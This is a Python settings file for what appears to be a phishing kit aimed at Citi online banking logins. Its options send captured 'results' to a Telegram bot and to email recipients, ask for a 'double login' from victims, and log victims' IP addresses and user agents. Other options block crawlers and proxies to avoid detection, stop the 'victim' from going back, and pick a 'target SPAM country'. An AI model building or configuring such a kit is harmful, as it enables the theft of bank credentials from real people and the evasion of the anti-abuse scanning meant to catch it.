import os


def _env_list(name, fallback=None):
    value = os.getenv(name)
    if value:
        return [item.strip() for item in value.split(',') if item.strip()]
    return list(fallback or [])


def _env_value(name, default=""):
    return os.getenv(name, default)


app_settings = {
    "log_user": "1",  # Log User-Agent, IP and Date
    "print_match": "0",  # Print Crawler Detections
    "anti-back": "1",  # Victim Can't Go Back To Session
    "debug": "0",  # Print Errors
    "proxy_block": "1",  # Detect Proxies & Block Them
    "send_mail": "1",  # Send E-Mail To Your Mail
    "save_results": "1",  # Save Results
    "telegram": "1",  # Telegram Bots Receiver
    "country": "US",  # Target SPAM Country
    "double_login": "1",  # Double login

    "chat_id": _env_value("TELEGRAM_CHAT_ID"),  # Chat ID Of You
    "bot_url": _env_value("TELEGRAM_BOT_URL"),  # Your Bot API Key (ADD "bot" BEFORE API KEY)
    "email": _env_value("NOTIFICATION_EMAIL"),  # Your E-Mail

    "referer": "https://live.com/",  # HTTP Referer For Antibots
    "out": "citi+login",  # Outcome Of AntiBots Forward - DONT CHANGE



    ###########

    "botToken": _env_value("TELEGRAM_BOT_TOKEN"),
    "chatId": _env_value("TELEGRAM_CHAT_ID"),  # The chat ID of the recipient

    'send_email_list': _env_list('EMAIL_RECIPIENTS'),
    'from_email': _env_value('DEFAULT_FROM_EMAIL', _env_value('EMAIL_HOST_USER')),
}

